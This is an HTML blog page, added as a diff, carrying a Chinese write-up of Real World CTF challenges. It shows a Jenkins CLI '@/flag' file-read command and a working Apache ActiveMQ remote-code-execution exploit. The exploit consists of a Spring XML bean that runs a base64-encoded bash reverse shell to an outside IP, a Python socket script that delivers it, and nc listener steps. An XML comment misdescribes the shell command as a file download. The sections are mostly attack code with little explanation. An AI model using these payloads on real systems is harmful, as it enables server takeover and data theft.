@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Be-a-Security-Researcher下载客户端1http:&#x2F;&#x2F;47.96.171.129:8080&#x2F;jnlpJars&#x2F;jenkins-cli.jar  CLI 客户端可以直接在URL &#x2F;jnlpJars&#x2F;jenkins-cli.jar从Jenkins主机下载, 实际上 https:&#x2F;&#x2F;JENKINS_URL&#x2F;jnlpJars&#x2F;jenkins-cli.jar 当 .jar 用于 Jenk">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RWCTF wp">
+<meta property="og:url" content="http://byesec.com/posts/6645322e.html">
+<meta property="og:site_name" content="patrik&#39;s blog">
+<meta property="og:description" content="Be-a-Security-Researcher下载客户端1http:&#x2F;&#x2F;47.96.171.129:8080&#x2F;jnlpJars&#x2F;jenkins-cli.jar  CLI 客户端可以直接在URL &#x2F;jnlpJars&#x2F;jenkins-cli.jar从Jenkins主机下载, 实际上 https:&#x2F;&#x2F;JENKINS_URL&#x2F;jnlpJars&#x2F;jenkins-cli.jar 当 .jar 用于 Jenk">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/07/CleanShot2024-01-29at18.25.51@2x.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/07/image-20240307112423113.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/07/image-20240307112559502.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/07/image-20240307112609509.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/07/image-20240307112618306.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/07/image-20240307112629678.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/07/image-20240307112639725.png">
+<meta property="article:published_time" content="2024-01-29T09:00:00.000Z">
+<meta property="article:modified_time" content="2024-03-07T03:32:35.521Z">
+<meta property="article:author" content="patrik">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/07/CleanShot2024-01-29at18.25.51@2x.png">
+    
+    
+      
+        
+          
+            <link rel="shortcut icon" href="https://www.gravatar.com/avatar/1c0ccb80f18de6871d3fd37b97cd3594?s=48">
+          
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/logo-1.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo-1.png">
+        
+      
+    
+    <!-- title -->
+    <title>RWCTF wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="patrik&#39;s blog" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/a820ff44.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/950ba293.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://byesec.com/posts/6645322e.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://byesec.com/posts/6645322e.html&text=RWCTF wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://byesec.com/posts/6645322e.html&title=RWCTF wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://byesec.com/posts/6645322e.html&is_video=false&description=RWCTF wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=RWCTF wp&body=Check out this article: http://byesec.com/posts/6645322e.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://byesec.com/posts/6645322e.html&title=RWCTF wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://byesec.com/posts/6645322e.html&title=RWCTF wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://byesec.com/posts/6645322e.html&title=RWCTF wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://byesec.com/posts/6645322e.html&title=RWCTF wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://byesec.com/posts/6645322e.html&name=RWCTF wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://byesec.com/posts/6645322e.html&t=RWCTF wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Be-a-Security-Researcher"><span class="toc-number">1.</span> <span class="toc-text">Be-a-Security-Researcher</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">1.1.</span> <span class="toc-text">下载客户端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">1.2.</span> <span class="toc-text">使用客户端</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Be-an-ActiveMq-Hacker"><span class="toc-number">2.</span> <span class="toc-text">Be-an-ActiveMq-Hacker</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc-xml"><span class="toc-number">2.1.</span> <span class="toc-text">poc.xml</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc-py"><span class="toc-number">2.2.</span> <span class="toc-text">poc.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Be-More-Elegant"><span class="toc-number">3.</span> <span class="toc-text">Be-More-Elegant</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        RWCTF wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">patrik</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-01-29T09:00:00.000Z" class="dt-published" itemprop="datePublished">2024-01-29</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%AE%89%E5%85%A8%F0%9F%94%90/">安全🔐</a> › <a class="category-link" href="/categories/%E5%AE%89%E5%85%A8%F0%9F%94%90/CTF%F0%9F%9A%A9/">CTF🚩</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Be-a-Security-Researcher"><a href="#Be-a-Security-Researcher" class="headerlink" title="Be-a-Security-Researcher"></a>Be-a-Security-Researcher</h2><h3 id="下载客户端"><a href="#下载客户端" class="headerlink" title="下载客户端"></a>下载客户端</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.96.171.129:8080/jnlpJars/jenkins-cli.jar</span><br></pre></td></tr></table></figure>
+
+<p>CLI 客户端可以直接在URL <code>/jnlpJars/jenkins-cli.jar</code>从Jenkins主机下载, 实际上 <code>https://JENKINS_URL/jnlpJars/jenkins-cli.jar</code></p>
+<p>当 <code>.jar</code> 用于 Jenkins的不同版本时, 在使用时出现兼容性问题, 请重新从Jenkins主机下载最新的 <code>.jar</code>文件。</p>
+<h3 id="使用客户端"><a href="#使用客户端" class="headerlink" title="使用客户端"></a>使用客户端</h3><p>调用客户端的一般语法如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jenkins-cli.jar [-s JENKINS_URL] [global options...] command [command options...] [arguments...]</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.exe -jar .\jenkins-cli.jar -s http://47.96.171.129:8080/  -webSocket who-am-i &quot;@/flag&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/07/CleanShot2024-01-29at18.25.51@2x.png" alt="CleanShot2024-01-29at18.25.51@2x"></p>
+<h2 id="Be-an-ActiveMq-Hacker"><a href="#Be-an-ActiveMq-Hacker" class="headerlink" title="Be-an-ActiveMq-Hacker"></a>Be-an-ActiveMq-Hacker</h2><h3 id="poc-xml"><a href="#poc-xml" class="headerlink" title="poc.xml"></a>poc.xml</h3><p>服务器vps上写一个poc.xml</p>
+<p>例如：反弹到101.43.189.65 3379端口</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag"> http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>bash<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- The command below downloads the file and saves it as test.elf --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDMuMTg5LjY1LzMzNzkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>开启http服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 3309</span><br></pre></td></tr></table></figure>
+
+<p>再开个终端NC监听反弹端口3379</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 3379</span><br></pre></td></tr></table></figure>
+
+<h3 id="poc-py"><a href="#poc-py" class="headerlink" title="poc.py"></a>poc.py</h3><p>运行poc.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">ip, port, xml</span>):</span><br><span class="line">    classname = <span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span></span><br><span class="line">    socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    socket_obj.connect((ip, port))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> socket_obj:</span><br><span class="line">        out = socket_obj.makefile(<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">        <span class="comment"># out = io.BytesIO()  # 创建一个内存中的二进制流</span></span><br><span class="line">        out.write(<span class="built_in">int</span>(<span class="number">32</span>).to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">bytes</span>([<span class="number">31</span>]))</span><br><span class="line">        out.write(<span class="built_in">int</span>(<span class="number">1</span>).to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">bool</span>(<span class="literal">True</span>).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">int</span>(<span class="number">1</span>).to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">bool</span>(<span class="literal">True</span>).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">bool</span>(<span class="literal">True</span>).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">len</span>(classname).to_bytes(<span class="number">2</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(classname.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">bool</span>(<span class="literal">True</span>).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(<span class="built_in">len</span>(xml).to_bytes(<span class="number">2</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        out.write(xml.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="comment"># print(list(out.getvalue()))</span></span><br><span class="line">        out.flush()</span><br><span class="line">        out.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Please specify the target and port and poc.xml: python3 poc.py 127.0.0.1 61616 &quot;</span></span><br><span class="line">              <span class="string">&quot;http://192.168.0.101:8888/poc.xml&quot;</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    main(sys.argv[<span class="number">1</span>], <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]), sys.argv[<span class="number">3</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 poc.py 120.26.63.137 61616 http://101.43.189.65:3309/poc.xml</span><br></pre></td></tr></table></figure>
+
+<p>![CleanShot2024-01-29at18.38.34@2x](<a target="_blank" rel="noopener" href="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/07/CleanShot">https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/07/CleanShot</a> 2024-01-29 at <a href="mailto:&#49;&#x38;&#x2e;&#51;&#56;&#x2e;&#x33;&#x34;&#x40;&#50;&#x78;&#46;&#112;&#x6e;&#x67;">&#49;&#x38;&#x2e;&#51;&#56;&#x2e;&#x33;&#x34;&#x40;&#50;&#x78;&#46;&#112;&#x6e;&#x67;</a>)</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/07/image-20240307112423113.png" alt="image-20240307112423113"></p>
+<h2 id="Be-More-Elegant"><a href="#Be-More-Elegant" class="headerlink" title="Be-More-Elegant"></a>Be-More-Elegant</h2><p>文件上传Filename绕过</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/07/image-20240307112559502.png" alt="image-20240307112559502"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/07/image-20240307112609509.png" alt="image-20240307112609509"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/07/image-20240307112618306.png" alt="image-20240307112618306"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/07/image-20240307112629678.png" alt="image-20240307112629678"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/07/image-20240307112639725.png" alt="image-20240307112639725"></p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Be-a-Security-Researcher"><span class="toc-number">1.</span> <span class="toc-text">Be-a-Security-Researcher</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">1.1.</span> <span class="toc-text">下载客户端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">1.2.</span> <span class="toc-text">使用客户端</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Be-an-ActiveMq-Hacker"><span class="toc-number">2.</span> <span class="toc-text">Be-an-ActiveMq-Hacker</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc-xml"><span class="toc-number">2.1.</span> <span class="toc-text">poc.xml</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc-py"><span class="toc-number">2.2.</span> <span class="toc-text">poc.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Be-More-Elegant"><span class="toc-number">3.</span> <span class="toc-text">Be-More-Elegant</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://byesec.com/posts/6645322e.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://byesec.com/posts/6645322e.html&text=RWCTF wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://byesec.com/posts/6645322e.html&title=RWCTF wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://byesec.com/posts/6645322e.html&is_video=false&description=RWCTF wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=RWCTF wp&body=Check out this article: http://byesec.com/posts/6645322e.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://byesec.com/posts/6645322e.html&title=RWCTF wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://byesec.com/posts/6645322e.html&title=RWCTF wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://byesec.com/posts/6645322e.html&title=RWCTF wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://byesec.com/posts/6645322e.html&title=RWCTF wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://byesec.com/posts/6645322e.html&name=RWCTF wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://byesec.com/posts/6645322e.html&t=RWCTF wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2024
+    patrik
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'byesec/blog_utteranc';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
